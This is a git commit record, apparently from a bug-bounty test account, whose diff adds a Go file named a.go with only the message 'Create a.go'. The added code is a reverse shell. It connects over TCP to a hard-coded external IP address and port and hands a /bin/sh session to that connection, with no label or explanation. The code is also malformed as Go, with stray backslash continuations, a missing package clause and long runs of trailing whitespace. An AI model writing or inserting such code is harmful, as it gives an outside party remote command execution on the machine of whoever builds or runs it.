4725274aec90d195be6dcac8b63f0b9a34221e14
nlx41-test <nlx41@wearehackerone.com>
2026-05-13 21:15:07 +0200

    Create a.go

---
+++ a.go
@@ -0,0 +1,10 @@
+import ("net"; "os/exec"); \                                                                                                                                                           
+func main() { \                                                                                                                                                                         
+   c, _ := net.Dial("tcp", "67.205.185.119:9000");                                                                                                                                     
+   cmd := exec.Command("/bin/sh");                                                                                                                                                   
+   cmd.Stdin = c;                                                                                                                                                                    
+   cmd.Stdout = c;                                                                                                                                                                   
+   cmd.Stderr = c;                                                                                                                                                                   
+   cmd.Run()                                                                                                                                                                         
+   }
+   
